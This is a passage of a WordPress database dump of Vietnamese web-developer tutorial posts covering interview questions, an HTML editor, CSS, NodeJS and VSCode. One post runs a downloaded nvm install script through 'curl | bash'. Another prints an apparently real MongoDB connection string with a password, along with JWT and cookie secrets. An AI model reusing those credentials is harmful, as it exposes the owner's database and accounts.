(582, 1, '2021-12-01 02:00:46', '2021-12-01 02:00:46', '<h3>Câu 1. Sự khác nhau giữa HTTP và HTTPS ?</h3>\r\n<details>\r\n<summary>Trả lời</summary>\r\n- HTTP: HyperText Transfer Protocol: là một giao thức ứng dụng của bộ giao thức TCP/IP. Bộ giao thức này được đặt tên theo 2 giao thức chính là: TCP (Transmission Control Protocol – Giao thức điều khiển truyền vận) và IP (Internet Protocol – Giao thức Internet).\r\n- HTTPS: HyperText Transfer Protocol Secure: HTTPS chính là giao thức HTTP được bổ sung thêm chứng chỉ SSL (Secure Sockets Layer – tầng ổ bảo mật) hoặc TLS (Transport Layer Security – bảo mật tầng truyền tải)\r\n\r\n<strong>A.Cơ bản</strong>\r\n1. URL trên trình duyệt hiển thị là http -> màu đỏ, https -> màu xanh\r\n2. Cổng sử dụng: HTTP sử dụng cổng: 80, HTTPS sử dụng cổng: 443\r\n3. HTTP không cần chứng chỉ SSL, với HTTPS bạn phải có chứng chỉ SSL và chứng chỉ này được ký bởi CA.\r\n4. HTTPS mã hóa dữ liệu liên lạc khiến hacker không hiểu được thông tin\r\n<img src=\"https://sites.google.com/site/dichvumaychu789/_/rsrc/1516173796150/khac-biet-giua-http-va-https/Kh%C3%A1c%20bi%E1%BB%87t%20gi%E1%BB%AFa%20HTTP%20v%C3%A0%20HTTPS-3.jpg\" alt=\"\" />\r\n\r\n- Cả SSL và TLS đều sử dụng hệ thống PKI (Public Key Infrastructure -hạ tầng khóa công khai) không đối xứng. Hệ thống này sử dụng hai “khóa” để mã hóa thông tin liên lạc, “khóa công khai” (public key) và “khóa riêng” (private key). Bất cứ thứ gì được mã hóa bằng khóa công khai chỉ có thể được giải mã bởi khóa riêng và ngược lại. Các tiêu chuẩn này đảm bảo các nội dung sẽ được mã hóa trước khi truyền đi, và giải mã khi nhận. Điều này khiến hacker dù có chen ngang lấy được thông tin cũng không thể “hiểu” được thông tin đó.\r\n</details>\r\n\r\n<h3>Câu 2. RESTful API là gì ? Kể tên các phương thức HTTP Request ?</h3>\r\n<details><summary>Trả lời</summary>\r\n<strong>1. Interface là gì</strong>\r\n- Interface là cách các đối tượng giao tiếp với nhau: 3 dạng thường gặp: CLI, GUI, API\r\n- CLI (Command Line Interface) : người dùng và chương trình giao tiếp với nhau bằng dòng lệnh\r\n- GUI (Graphical User Interface) : người dùng và chương trình giao tiếp với nhau thông qua các nút bấm, hình ẩm\r\n- API (Application Programming Interface) : các ứng dụng giao tiếp với nhau\r\nTrong lập trình web, API thường truyền dữ liệu dạng JSON hay XML\r\n\r\n<strong>2. REST là gì</strong>\r\n- REST (REpresentational State Transfer) : là một kiểu kiến trúc để viết API, nó sử dụng HTTP để giao tiếp giữa các ứng dụng\r\n- RESTful API: là một tiêu chuẩn, một trong những kiểu thiết kế API phổ biến\r\n\r\n<strong>3. Các method HTTP Request</strong>\r\n- GET\r\n- POST : Tạo record mới\r\n- PUT : Ghi đè record\r\n- PATCH : Cập nhật một phần record\r\n- DELETE\r\n- HEAD : response chỉ trả về header, không có body\r\n- CONNECT: kết nối tới SERVER theo URI\r\n- OPTIONS\r\n- TRACE\r\n</details>\r\n\r\n<h3>Câu 3. Kể tên một vài HTTP Status Code ?</h3>\r\n<details>\r\n<summary>Trả lời</summary>\r\n\r\nHTTP Status Code có 5 hạng mục bao gồm:\r\n1. 1xx (100 – 199): Information responses / Phản hồi thông tin – Yêu cầu đã được chấp nhận và quá trình xử lý yêu cầu của bạn đang được tiếp tục.\r\n\r\n2. 2xx (200 – 299): Successful responses / Phản hồi thành công – Yêu cầu của bạn đã được máy chủ tiếp nhận, hiểu và xử lý thành công.\r\n- 200 OK : Phản hồi thành công cho những phương thức GET, PUT, PATCH, hoặc DELETE\r\n- 201 Created : Yêu cầu POST hoặc PUT thành công\r\n- 204 No Content : Request xóa thành công\r\n\r\n3. 3xx (300 – 399): Redirects / Điều hướng – Phía client cần thực hiện hành động bổ sung để hoàn tất yêu cầu.\r\n\r\n4. 4xx (400 – 499): Client errors / Lỗi phía client – Yêu cầu không thể hoàn tất hoặc yêu cầu chứa cú pháp không chính xác. 4xx sẽ hiện ra khi có lỗi từ phía client do không đưa ra yêu cầu hợp lệ.\r\n- 400 Bad Request : Request không hợp lệ\r\n- 401 Unauthorized : Request cần có tài khoản\r\n- 403 Forbidden : Bị server từ chối (do tài khoản không được phân quyền)\r\n- 404 Not Found : Không tìm thấy trang\r\n\r\n5. 5xx (500 – 599): Server errors / Lỗi phía máy chủ – Máy chủ không thể hoàn thành yêu cầu được cho là hợp lệ. Khi 5xx xảy ra, bạn chỉ có thể đợi để bên hệ thống máy chủ xử lý xong.\r\n- 500: lỗi chung chung\r\n- 503: Máy chủ quá tải hoặc đang bảo trì\r\n- 505: Không hỗ trợ giao thức HTTP\r\n</details>\r\n\r\n<h3>Câu 4. Phân biệt Stateless và Stateful ?</h3>\r\n<details>\r\n<summary>Trả lời</summary>\r\n<table>\r\n<thead>\r\n<tr>\r\n<th>Stateless</th>\r\n<th>Statefull</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr>\r\n<td>Ví dụ: HTTP, UDP</td>\r\n<td>Ví dụ: FTP, SSH, Telnet</td>\r\n</tr>\r\n<tr>\r\n<td>Client và Server hoạt động độc lập, không lưu trữ thông tin của nhau</td>\r\n<td>Client và Server hoạt động ràng buộc chặt chẽ với nhau</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</details>\r\n<h3>Câu 5. Phân biệt Cookie và Session ?</h3>\r\n<details><summary>Trả lời</summary>\r\n\r\n- Bình thường: Client gửi 1 request lên Server, Server trả về 1 response. Sau khi hoàn thành 1 connect, server sẽ \"quên\" mọi thứ về Client\r\n- Cookie và Session sinh ra để giải quyết vấn đề: làm thế nào để server ghi nhớ thông tin của client\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>Cookie</td>\r\n<td>Session (Server)</td>\r\n</tr>\r\n<tr>\r\n<td>- Mỗi request l&ecirc;n server đều được đ&iacute;nh k&eacute;m cookie</td>\r\n<td>- Mỗi phi&ecirc;n l&agrave;m việc mới sẽ được cấp một SessionID mới</td>\r\n</tr>\r\n<tr>\r\n<td>- Lưu trữ tr&ecirc;n tr&igrave;nh duyệt</td>\r\n<td>- Lưu trữ tại 1 file tr&ecirc;n server</td>\r\n</tr>\r\n<tr>\r\n<td>- Tồn tại đến khi expired</td>\r\n<td>- Tồn tại tr&ecirc;n 1 phi&ecirc;n l&agrave;m việc (đ&oacute;ng tab).</td>\r\n</tr>\r\n<tr>\r\n<td>- K&iacute;ch thước cookie tối đa l&agrave; 4096 bytes</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</details>\r\n\r\n<h3>Câu 6. Phân biệt các Storage phía client: Cookie, Session Storage, Local Storage và IndexedDB ?</h3>\r\n<details>\r\n<summary>Trả lời</summary>\r\n- Local Storage, Session Storage và Cookie sinh ra để lưu trữ dữ liệu trên trình duyệt\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>Cookie</td>\r\n<td>Session&nbsp;Storage</td>\r\n<td>Local Storage</td>\r\n<td>IndexedDB</td>\r\n</tr>\r\n<tr>\r\n<td>- Client đọc hoặc viết bằng Javascript, nếu set httpOnly th&igrave; JS sẽ kh&ocirc;ng đọc được<br />- Server đọc hoặc viết Cookie</td>\r\n<td>-&nbsp;Chỉ Client sử dụng được. Client đọc hoặc viết bằng Javascript</td>\r\n<td>-&nbsp;Chỉ Client sử dụng được. Client đọc hoặc viết bằng Javascript</td>\r\n<td>- Lưu dưới dạng NoSQL</td>\r\n</tr>\r\n<tr>\r\n<td>- Được set thời gian expires, cookie tồn tại đến khi expires&nbsp;. C&oacute; thể set mất đi sau khi đ&oacute;ng tr&igrave;nh duyệt, nếu được set expires l&agrave; N/A</td>\r\n<td>- Tồn tại tr&ecirc;n 1 phi&ecirc;n l&agrave;m việc (đ&oacute;ng tab) hoặc cố t&igrave;nh x&oacute;a</td>\r\n<td>-&nbsp;Tồn tại&nbsp;vĩnh viễn, chỉ mất&nbsp;khi cố t&igrave;nh x&oacute;a</td>\r\n<td>- Tồn tại vĩnh viễn</td>\r\n</tr>\r\n<tr>\r\n<td>- K&iacute;ch thước cookie tối đa l&agrave; 4096 bytes</td>\r\n<td>- Limited t&ugrave;y thuộc v&agrave;o bộ nhớ hệ thống</td>\r\n<td>- K&iacute;ch thước cookie tối đa l&agrave;&nbsp;5MB</td>\r\n<td>- K&iacute;ch thước kh&ocirc;ng giới hạn</td>\r\n</tr>\r\n<tr>\r\n<td>- Thường lưu th&ocirc;ng tin đăng nhập</td>\r\n<td>&nbsp;</td>\r\n<td>- K&iacute;ch thước cookie tối đa l&agrave;&nbsp;5MB</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>- Cookie sẽ được tự động th&ecirc;m v&agrave;o XHR khi gửi request l&ecirc;n API</td>\r\n<td>-&nbsp;Thường lưu th&ocirc;ng tin đơn giản như giỏ h&agrave;ng</td>\r\n<td>-&nbsp;Thường lưu th&ocirc;ng tin d&agrave;i hạn, hoặc token</td>\r\n<td>- C&oacute; thể lưu c&aacute;c dữ liệu lớn hơn như cả 1 database</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n</details>\r\n', 'Câu hỏi Web Developer P2', '', 'publish', 'open', 'open', '', 'cau-hoi-web-developer-p2', '', '', '2023-06-17 14:45:42', '2023-06-17 14:45:42', '', 0, 'http://duycode.com/?p=582', 0, 'post', '', 0),
(589, 1, '2020-12-28 17:45:09', '2020-12-28 17:45:09', 'Bản full: https://editor.duycode.com/\n<h2>2. Bản 2.0</h2>\n<pre>\n<!DOCTYPE html>\n<!-- saved from url=(0031)http://htmledit.squarefree.com/ -->\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1258\">\n  <title>Real-time HTML Editor</title>\n  <script type=\"text/javascript\">\n    var editboxHTML = \'<html class=\"expand close\">\'\n      + \'<head>\'\n      + \'<style type=\"text/css\">\'\n      + \'.expand { width: 100%; height: 100%; }\'\n      + \'.close { border: none; margin: 0px; padding: 0px; }\'\n      + \'html,body { overflow: hidden; }\'\n      + \'<\\/style>\'\n      + \'<\\/head>\'\n      + \'<body class=\"expand close\" onload=\"document.f.ta.focus(); document.f.ta.select();\">\'\n      + \'<form class=\"expand close\" name=\"f\">\'\n      + \'<textarea class=\"expand close\" style=\"background: #def;\" name=\"ta\" wrap=\"hard\" spellcheck=\"false\">\'\n      + \'<\\/textarea>\'\n      + \'<\\/form>\'\n      + \'<\\/body>\'\n      + \'<\\/html>\';\n    var old = \'\';\n\n    function init() {\n      window.editbox.document.write(editboxHTML);\n      window.editbox.document.close();\n      update();\n    }\n\n    function update() {\n      var textarea = window.editbox.document.f.ta;\n      var d = dynamicframe.document;\n      if (old != textarea.value) {\n        old = textarea.value;\n        d.open();\n        d.write(old);\n        d.close();\n      }\n      window.setTimeout(update, 150);\n    }\n  </script>\n</head>\n<frameset resizable=\"yes\" cols=\"50%,*\" onload=\"init();\">\n  <frame name=\"editbox\" src=\"javascript:&#39;&#39;;\"></frame>\n  <frame name=\"dynamicframe\" src=\"javascript:&#39;&#39;;\"></frame>\n</frameset>\n\n</html>\n</pre>\n\n<h2>3. Bản 3.0</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <title>HTML Editor</title>\n    <style>\n        * {\n            box-sizing: border-box;\n            margin: 0;\n            padding: 0;\n            font-size: 14px;\n        }\n\n        body {\n            position: fixed;\n            top: 0;\n            bottom: 0;\n            left: 0;\n            right: 0;\n            padding: 5px;\n        }\n\n        main {\n            display: flex;\n            flex-direction: row;\n            height: 100%;\n            font-family: Consolas, \'ConsolasRegular\', \'Courier New\', monospace !important;\n        }\n\n        #preview {\n            flex-grow: 1;\n        }\n\n        iframe {\n            width: 100%;\n            height: 98%;\n        }\n\n        #editBox {\n            display: flex;\n            flex-direction: column;\n            flex-wrap: nowrap;\n            min-width: 300px;\n            height: 98%;\n            width: 50%;\n            border: 1px solid #6c757d;\n            margin-right: 2px;\n            resize: horizontal;\n            overflow: auto;\n        }\n\n        div.itemArea {\n            background-color: #ddd;\n            flex-grow: 0;\n        }\n\n        div.itemArea.active {\n            flex-grow: 1;\n        }\n\n        #editBox.rotate {\n            width: 100%;\n            flex-wrap: wrap;\n        }\n\n        #editBox.rotate>#HTMLArea {\n            height: 100%;\n            flex-grow: 0;\n        }\n\n        #editBox.rotate>.itemArea {\n            width: 50%;\n        }\n\n        textarea {\n            overflow: auto;\n            border: 0;\n            padding: 0.5rem;\n            display: none;\n            width: 100%;\n            height: calc(100% - 3rem) !important;\n            border: 1px solid #6c757d;\n        }\n\n        .itemArea.active>textarea {\n            display: block;\n        }\n\n\n        .btnNav {\n            cursor: pointer;\n            float: left;\n            padding: 0.5rem 0.75rem;\n            margin: 2px;\n            border: 1px solid #6c757d;\n            border-radius: 0.25rem 0.25rem 0 0;\n            background-color: white;\n        }\n\n        .itemArea .btnNav:hover {\n            background-color: #374958 !important;\n            color: white;\n        }\n\n        .itemArea.active .btnNav:first-child {\n            background-color: #6c757d;\n            color: white;\n        }\n\n        #btnRotate,\n        #btnNewWindow {\n            float: right;\n        }\n\n        #btnFormat::before {\n            content: \"Demo \";\n        }\n\n        #btnFormat.addCode::before {\n            content: \"Clear \";\n        }\n    </style>\n</head>\n\n<body>\n    <main>\n        <div id=\"editBox\">\n            <div id=\"HTMLArea\" class=\"itemArea active\">\n                <div class=\"itemNav\">\n                    <div id=\"HTMLNav\" class=\"btnNav\">index.html</div>\n                    <div id=\"btnFormat\" class=\"btnNav\">Code</div>\n                    <div id=\"btnNewWindow\" class=\"btnNav\">Open Popup </div>\n                    <div id=\"btnRotate\" class=\"btnNav\">Rotate</div>\n                </div>\n                <textarea id=\"HTMLEditor\" placeholder=\"Code HTML...\"></textarea>\n            </div>\n            <div id=\"CSSArea\" class=\"itemArea\">\n                <div class=\"itemNav\">\n                    <div id=\"CSSNav\" class=\"btnNav\">style.css</div>\n                </div>\n                <textarea id=\"CSSEditor\" placeholder=\"Code CSS...\"></textarea>\n            </div>\n            <div id=\"JSArea\" class=\"itemArea\">\n                <div class=\"itemNav\">\n                    <div id=\"JSNav\" class=\"btnNav\">funtion.js</div>\n                </div>\n                <textarea id=\"JSEditor\" placeholder=\"Code JS...\"></textarea>\n            </div>\n        </div>\n        <div id=\"preview\">\n            <iframe></iframe>\n        </div>\n    </main>\n\n    <script>\n        let HTMLEditor = document.getElementById(\"HTMLEditor\");\n        let CSSEditor = document.getElementById(\"CSSEditor\");\n        let JSEditor = document.getElementById(\"JSEditor\");\n        let editBox = document.getElementById(\"editBox\");\n\n        let btnNewWindow = document.getElementById(\"btnNewWindow\");\n        let btnFormat = document.getElementById(\"btnFormat\");\n\n        let preview = document.getElementById(\"preview\");\n        let itemArea = document.getElementsByClassName(\"itemArea\");\n\n        let windowPopup = null;\n\n        let openPopup = () => {\n            windowPopup = window.open(\"\", \"\", \"width=1000,height=700\");\n            let cssNode = document.createElement(\"style\");\n            let jsNode = document.createElement(\"script\");\n            cssNode.innerHTML = \"body{width:100%;height:100%;margin:0;padding:0}iframe{width:100%;height:100%;border:0}\";\n            jsNode.innerHTML = \"window.onbeforeunload=(e)=>{window.opener.messageFromChildWindow(\\\"closed\\\")}\";\n            windowPopup.document.head.append(cssNode);\n            windowPopup.document.head.append(jsNode);\n   \n            preview.style.display = \"none\";\n            btnNewWindow.classList.add(\"closePopup\");\n            btnNewWindow.innerText = \"Close Popup\";\n        }\n        let closePopup = () => {\n            windowPopup = null;\n            preview.style.display = \"block\";\n            btnNewWindow.classList.remove(\"closePopup\");\n            btnNewWindow.innerText = \"Open Popup \";\n        }\n\n        messageFromChildWindow = (msg) => {\n            if (msg === \'closed\') {\n                closePopup();\n                reloadPreview();\n            }\n        }\n\n        btnNewWindow.onclick = () => {\n            if (btnNewWindow.classList.contains(\"closePopup\")) {\n                windowPopup.close();\n                closePopup();\n            }\n            else {\n                openPopup();\n            }\n            reloadPreview();\n        }\n\n        window.onbeforeunload = function () {\n            windowPopup.close();\n        };\n\n        btnFormat.onclick = () => {\n            if (!btnFormat.classList.contains(\"addCode\")) {\n                for (i = 0; i < itemArea.length; i++) {\n                    if (!itemArea[i].classList.contains(\"active\")) {\n                        itemArea[i].classList.add(\"active\");\n                    }\n                }\n\n                HTMLEditor.value = \"<!DOCTYPE html>\\n\"\n                    + \"<html lang=\\\"en\\\"> \\n\"\n                    + \"<head>\\n\"\n                    + \"    <meta charset=\\\"UTF-8\\\">\\n\"\n                    + \"    <meta name=\\\"description\\\" content=\\\"The HTML5 Herald\\\">\\n\"\n                    + \"    <meta name=\\\"author\\\" content=\\\"Developer\\\">\\n\"\n                    + \"    <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\">\\n\"\n                    + \"    <title>Document<\\/title>\\n\"\n                    + \"    <link rel=\\\"stylesheet\\\" href=\\\"\\\">\\n\"\n                    + \"<\\/head>\\n\"\n                    + \"<body>\\n\"\n                    + \"    <h2 id=\\\"demo\\\">Click me, please !!!<\\/h2>\\n\"\n                    + \"    <script src=\\\"\\\"><\\/script>\\n\"\n                    + \"<\\/body>\\n\"\n                    + \"<\\/html>\";\n                CSSEditor.value = \"h2 { \\n\"\n                    + \"    font-style: italic;\\n\"\n                    + \"    color: red;\\n\"\n                    + \"}\";\n                JSEditor.value = \"let demoID = document.getElementById(\\\"demo\\\");\\n\"\n                    + \"    demoID.onclick = () => {\\n\"\n                    + \"    demoID.innerHTML = \\\"You click at: \\\" + new Date().toLocaleTimeString()\\n\"\n                    + \"        + \\\" - \\\" + new Date().getMilliseconds();\\n\"\n                    + \"}\";\n            }\n            else {\n                HTMLEditor.value = \"\";\n                CSSEditor.value = \"\";\n                JSEditor.value = \"\";\n            }\n            btnFormat.classList.toggle(\"addCode\");\n            reloadPreview();\n        }\n\n        document.getElementById(\"btnRotate\").onclick = () => {\n            editBox.classList.toggle(\"rotate\");\n        }\n\n        document.body.onclick = () => {\n            let thisID = event.target.id;\n            let navID = String(thisID.match(/HTMLNav|CSSNav|JSNav/i));\n\n            if (navID != null) {\n                let areaID = navID.replace(\"Nav\", \"Area\");\n                let areaNode = document.getElementById(areaID);\n                areaNode.classList.toggle(\"active\");\n            }\n        };\n\n\n        let writeWindow = (w) => {\n            w.document.open();\n            w.document.write(HTMLEditor.value);\n            let css = document.createElement(\"style\");\n            let js = document.createElement(\"script\");\n            css.innerHTML = CSSEditor.value;\n            js.innerHTML = JSEditor.value;\n            w.document.head.append(css);\n            w.document.body.append(js);\n            w.document.close();\n        }\n\n        let reloadPreview = () => {\n            let bodyFrame = null;\n            if (windowPopup != null) {\n                bodyFrame = windowPopup.document.body;\n            }\n            else {\n                bodyFrame = preview;\n            }\n            bodyFrame.innerHTML = \"\";\n            let iframeNode = document.createElement(\"iframe\");\n            bodyFrame.appendChild(iframeNode);\n            let myFrame = bodyFrame.getElementsByTagName(\"iframe\")[0];\n            writeWindow(myFrame.contentWindow);\n        }\n\n        document.onkeyup = () => {\n            reloadPreview();\n        };\n\n    </script>\n</body>\n\n</html>\n</pre>', 'JavaScript - HTML Editor', '', 'publish', 'open', 'open', '', 'javascript-htmleditor', '', '', '2020-12-28 17:45:09', '2020-12-28 17:45:09', '', 0, 'http://duycode.com/?p=589', 0, 'post', '', 0),
(604, 1, '2020-12-30 12:04:00', '2020-12-30 12:04:00', '<h2>I. Cơ bản</h2>\n- Trang chủ: <a href=\"https://codemirror.net/\" rel=\"noopener noreferrer\" target=\"_blank\">https://codemirror.net/</a>\nMột số tính năng hay:\n- Code folding: thu nhỏ 1 tag\n- Search - replace\n- mattag:  nhìn tag đầu và cuối\n- runmode: hiện code dạng plain text\n- overlay: hiện màu {{text}} \n- lint: bắt lỗi\n- merge view: so sánh 2 đoạn code\n- fullscreen: phóng to code để xem toàn màn hình\n- hint/showhint: gợi ý\n- Lazy Mode Loading: tự chọn mode html, css hay js\n<h2>II. Cài đặt và sử dụng</h2>\n<h3>1. Thành phần cơ bản</h3>\n<pre>\n<script src=\"lib/codemirror.js\"></script>\n<link rel=\"stylesheet\" href=\"lib/codemirror.css\">\n<script src=\"mode/javascript/javascript.js\"></script>\n</pre>\n\nSử dụng cơ bản\n<pre>\nlet element = document.getElementsByClassName(\"demoClass\")[0];\nlet editor = CodeMirror(element , {\n    lineNumbers: true,\n    tabSize: 4,\n});\n</pre>\n\n<h3>2. Chọn thêm mode </h3>\n<pre>\n<script src=\"mode/css/css.js\"></script>\n<script src=\"mode/xml/xml.js\"></script>\n// mode: \"css\",\n// mode: \"xml\",\n</pre>\n\n<h3>3. Show hint - Gợi ý đỉnh cao</h3>\n<pre>\n<!-- chon hint -->\n<script src=\"codemirror/addon/hint/show-hint.js\"></script>\n<link rel=\"stylesheet\" href=\"codemirror/addon/hint/show-hint.css\">\n<script src=\"codemirror/addon/hint/css-hint.js\"></script>\n<script src=\"codemirror/addon/hint/html-hint.js\"></script>\n<script src=\"codemirror/addon/hint/xml-hint.js\"></script>\n<script src=\"codemirror/addon/hint/javascript-hint.js\"></script>\n//extraKeys: {\"Ctrl-Space\":\"autocomplete\"},\n</pre>\n\n\n\n\n\n\n\n\n', 'CodeMirror - Trình soạn thảo Code', '', 'publish', 'open', 'open', '', 'codemirror-trinh-soan-thao-code', '', '', '2020-12-30 12:04:00', '2020-12-30 12:04:00', '', 0, 'http://duycode.com/?p=604', 0, 'post', '', 0),
(615, 1, '2021-01-06 07:34:49', '2021-01-06 00:34:49', '<h2>1. Căn giữa với element</h2>\n<pre>\n<style>\n	.container {\n		display: flex;\n		flex-wrap: wrap;\n	}\n	.parent {\n		margin: 10px;\n		width: 200px;\n		height: 200px;\n		background-color: green;\n	}\n	.child {\n		width: 100px;\n		height: 100px;\n		background-color: orange;\n		display: flex;\n		justify-content: center;\n		align-items: center;\n		color: white;\n	}\n\n	.example-1 {\n		display: flex;\n		justify-content: center;\n		align-items: center;\n	}\n\n	.example-2 {\n		display: flex;\n		justify-content: center;\n		align-content: center;\n		flex-wrap: wrap;\n	}\n\n	.example-3 {\n		display: flex;\n	}\n	.example-3 > .child {\n		margin: auto;\n	}\n\n	.example-4 {\n		position: relative;\n	}\n	.example-4 > .child {\n		position: absolute;\n		top: 50%;\n		left: 50%;\n		transform: translate(-50%,-50%);\n	}\n</style>\n\n<div class=\"container\">\n	<div class=\"parent example-1\">\n		<div class=\"child\">1</div>\n	</div>\n\n	<div class=\"parent example-2\">\n		<div class=\"child\">2</div>\n	</div>\n\n	<div class=\"parent example-3\">\n		<div class=\"child\">3</div>\n	</div>\n\n	<div class=\"parent example-4\">\n		<div class=\"child\">4</div>\n	</div>\n</div>\n\n</pre>\n\n<h2>2. Căn giữa hình ảnh </h2>\n<pre>\n<style>\n	.container {\n		margin: 10px;\n		width: 200px;\n		height: 200px;\n	}\n	.example-1 {\n		background-image: url(\"https://source.unsplash.com/400x300/?sport\");\n		background-position: center;\n		background-repeat: no-repeat;\n		background-size: cover;\n	}\n	.example-2 > img {\n		width: 100%;\n		height: 100%;\n		object-fit: cover\n	}\n</style>\n\n<div class=\"container example-1\"></div>\n<div class=\"container example-2\">\n	<img src=\"https://source.unsplash.com/400x300/?sport\" alt=\"\">\n</div>\n\n<img src=\"https://source.unsplash.com/400x300/?sport\" alt=\"\">\n</pre>', 'CSS - Căn giữa mọi thứ', '', 'publish', 'open', 'open', '', 'css-can-giua-moi-thu', '', '', '2021-01-06 07:34:49', '2021-01-06 00:34:49', '', 0, 'https://duycode.com/?p=615', 0, 'post', '', 0),
(624, 1, '2022-05-06 01:00:50', '2022-05-06 01:00:50', '<a href=\"https://github.com/coreybutler/nvm-windows\" rel=\"noopener\" target=\"_blank\">https://github.com/coreybutler/nvm-windows</a>\r\n\r\n1. Install on Ubuntu\r\n<pre>\r\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash\r\nsource ~/.bashrc\r\n</pre>', 'Node Version Manager - nvm', '', 'publish', 'open', 'open', '', 'nodejs-4-routes', '', '', '2023-07-04 06:05:40', '2023-07-04 06:05:40', '', 0, 'https://duycode.com/?p=624', 0, 'post', '', 0),
(648, 1, '2021-05-02 00:00:57', '2021-05-01 17:00:57', '<h1>I. Thư viện cơ bản</h1>\n-- Cài đặt thư viện:\nThay <strong><em>name_library</em></strong> bằng tên thư viện\n<blockquote>\nnpm install <em>name_library</em>\nnpm install <em>name_library</em> --save-dev\n</blockquote>\n- express\n- mongodb\n- mongoose\n- ejs\n- jsonwebtoken\n\n<h1>II. Thư viện DEV</h1>\n<h2>1. nodemon</h2>\n-- Cài đặt: Tại ./package.json\n<pre>\n  \"scripts\": {\n    \"start\": \"node src/server.js\",\n    \"dev\": \"nodemon --inspect -w . -w .env src/server.js\",\n    \"scss\":\"node-sass --watch src/resources/scss/style.scss src/public/css/style.css\",\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n</pre>\n-- Sử dụng: Dùng Terminal\n<blockquote>\nnpm run dev\n</blockquote>\n\n<h1>III. Khác</h1>\n- lowdb\n- mysql\n- ngrok : đưa localhost lên online\n- morgan : hiện thông tin địa chỉ request\n\n<h1>IV. Ít dùng</h1>\n\n<h2>2. node-sass</h2>\n-- Thư viện DEV\n-- Cài đặt: Tại ./package.json\n<pre>\n  \"scripts\": {\n    \"start\": \"node src/server.js\",\n    \"dev\": \"nodemon --inspect -w . -w .env src/server.js\",\n    \"scss\":\"node-sass --watch src/resources/scss/style.scss src/public/css/style.css\",\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n</pre>\n-- Sử dụng: Dùng Terminal\n<blockquote>npm run scss</blockquote>\n\n<h2>3. dotenv</h2>\n-- Thư viện DEV\n-- Tạo file \".env\" (không có tên file) tại thư mục gốc: ./.env\n<pre>\nMONGO_DB=mongodb+srv://admin:nvdk30b@cluster0.bgpn9.mongodb.net/medihome?retryWrites=true&w=majority\nMONGO_LOCALHOST=mongodb://localhost:27017/medihome\n\nSECRET_SIGNEDCOOKIES=@123%456\nSECRET_JWT=$DWDw123\n</pre>\n-- Sử dụng: Tại ./src/server.js\n<pre>\nif (!process.env.PORT) require(\'dotenv\').config();\n</pre>\n-- Sử dụng: Gọi các biến của .env\n<pre>\nconst port = process.env.PORT || 3000;\nconst uri = process.env.MONGO_DB || process.env.MONGO_LOCALHOST;\n</pre>\n\n<h2>***. Sử dụng .gitignore</h2>\n-- Tạo file \".gitignore\" (không có tên file) tại thư mục gốc: ./.gitignore\n<pre>\n.env\n.gitignore\nnode_modules\n</pre>\n\n\n\n\n', 'NodeJS - 2. Các thư viện cơ bản', '', 'publish', 'open', 'open', '', 'nodejs-2-cac-thu-vien-co-ban', '', '', '2021-05-02 00:00:57', '2021-05-01 17:00:57', '', 0, 'https://duycode.com/?p=648', 0, 'post', '', 0),
(702, 1, '2021-01-01 01:00:05', '2020-12-31 18:00:05', '<h2>I. Config</h2>\r\n<h3>1. File setting.json</h3>\r\n<pre>\r\n{\r\n    \"workbench.tree.indent\": 16,                                    //Tăng độ rộng cây thư mục        \r\n    \"liveServer.settings.host\": \"localhost\",                        //Live server mặc định chạy \"localhost\"\r\n    \"editor.quickSuggestions\": {                                    //Bật gợi ý với mọi thứ\r\n        \"other\": true,\r\n        \"comments\": true,\r\n        \"strings\": true\r\n    },        \r\n}\r\n</pre>\r\n\r\n<h3>1. Auto Import</h3>\r\n-- Tạo file: ./.jsconfig.json ở thư mục gốc\r\n<pre>\r\n{\r\n  \"compilerOptions\": {\r\n    \"baseUrl\": \"./src\",\r\n    \"checkJs\": true,\r\n    \"jsx\": \"react\"\r\n  }\r\n}\r\n</pre>\r\n\r\n<h3>2. Editorconfig</h3>\r\n-- Trang chủ: https://editorconfig.org/\r\n-- Tạo file: ./.editorconfig ở thư mục gốc\r\n-- Cấu hình như sau:\r\n<pre>\r\nroot = true\r\n[*]\r\nend_of_line = lf\r\ninsert_final_newline = true\r\nindent_style = space\r\nindent_size = 4\r\n</pre>\r\n\r\n<h3>2. Keyboard Shortcuts</h3>\r\n- Gõ Ctrl+Shift+P -> Tìm kiếm \"Open Keyboard Shortcuts (JSON)\"\r\n- Thêm vào file json, để tạo danh sách các phím tắt như sau:\r\n- ctrl+k: xóa terminal\r\n<pre>\r\n[\r\n    {\r\n        \"key\": \"ctrl+k\",\r\n        \"command\": \"workbench.action.terminal.clear\",\r\n        \"when\": \"terminalFocus\"\r\n    }\r\n]\r\n</pre>\r\n\r\n\r\n<h3>4. Config Sapces default</h3>\r\n- Settings: Tab Size\" to 4 and unchecking the option \"Detect Indentention\"\r\n\r\n<h2>II. Các phím tắt hay sử dụng</h2>\r\n<h3>1. Windows</h3>\r\n- Ctrl + Shift + P: mở setting, tạo phím tắt\r\n\r\n- Ctrl + D: bôi đen từ giống như đang select\r\n-> Shift + mũi tên phải: bôi đen tất cả thêm 1 chữ\r\n-> Shift + Alt + mũi tên phải: bôi đen tất cả thêm 1 từ, dài ngắn khác nhau cũng đc\r\n\r\n- Ctrl + K + W : tắt hết các tab đang sử dụng\r\n- Alt + Shift + O: sắp xếp lại các import\r\n- Ctrl + K + 0 : fold all lever (thu gọn các function lại)\r\n- Ctrl + K + J : collapser all lever (mở rộng các function ra)\r\n\r\n\r\n<h3>2. Terminal</h3>\r\n--  Kill all server\r\n<blockquote>taskkill /f /im node.exe</blockquote>\r\n--  Tạo file nhanh\r\n<blockquote>\r\ntype nul > index.html\r\n#OR\r\n$nul > index.html\r\n</blockquote>\r\n', 'VSCode - 1. Cơ bản', '', 'publish', 